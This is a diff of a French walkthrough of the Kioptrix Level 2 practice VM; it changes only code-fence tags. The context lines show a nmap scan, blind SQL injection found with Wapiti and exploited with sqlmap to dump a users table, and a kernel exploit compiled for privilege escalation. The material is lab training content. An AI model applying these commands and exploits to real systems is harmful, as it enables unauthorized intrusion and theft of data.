@@ -10,7 +10,7 @@ Comme prévu les walkthroughs à venir concernent la saga *Kioptrix*, ici il s'a
 Web exploitation 101
 --------------------
 
-```plain
+```
 Nmap scan report for 192.168.1.39
 Host is up (0.00021s latency).
 Not shown: 65528 closed ports
@@ -55,7 +55,7 @@ PORT     STATE SERVICE  VERSION
 
 Le site web dispose d'une page de login très basique (champs user, password, bouton submit). *Wapiti* n'en fait qu'une bouchée :  
 
-```plain
+```
 [*] Lancement du module blindsql
 ---
 Faille d'injection SQL en aveugle dans http://192.168.1.39/index.php via une injection dans le paramètre uname
@@ -77,7 +77,7 @@ python sqlmap.py -u http://192.168.1.39/index.php --data "uname=Administrator&ps
 
 Après avoir obtenu le nom de la base de données et des tables intéressantes on peut dumper le contenu de la table users avec *-D webapp -T users --dump*  
 
-```plain
+```
 Database: webapp
 Table: users
 [2 entries]
@@ -120,7 +120,7 @@ On en profite pour chercher quelques identifiants :
 
 Les identifiants ne permettent pas d'accéder aux comptes présents (*harold* et *john*) mais comme c'est un *Kioptrix* il suffit de chercher le bon exploit pour le système :  
 
-```plain
+```
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
 
 LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
@@ -132,7 +132,7 @@ Codename:       Final
 
 Ce qui nous amène à [une faille](https://www.exploit-db.com/exploits/9542/) découverte par *Tavis Ormandy* et *Julien Tinnes* touchant le kernel.  
 
-```plain
+```
 bash-3.00$ gcc -o sploit sploit.c
 gcc -o sploit sploit.c
 sploit.c:109:28: warning: no newline at end of file
